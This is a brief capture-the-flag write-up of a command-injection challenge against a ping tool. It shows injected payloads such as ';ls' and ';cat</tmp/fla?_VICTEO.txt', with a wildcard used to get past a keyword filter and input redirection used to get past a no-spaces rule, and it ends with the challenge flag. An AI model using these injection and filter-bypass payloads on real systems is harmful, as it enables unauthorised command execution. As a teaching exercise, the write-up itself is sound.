trying to terminate the first ping command and start to list the content of current dir
;ls

there is a file called flag (elf binary) so we can execute it but the word flag is forbidden so let's try wildcards
;/fla?

worked and gave us the path to the flag file
/tmp/fla?_VICTEO.txt

spcing commands is not allowed so we can redirect the stream of this file to cat 
;cat</tmp/fla?_VICTEO.txt

and voila 
EGCERT{3x3cut3_d38e99_c0Mm2nD$_With0ut_Sp2c3s}
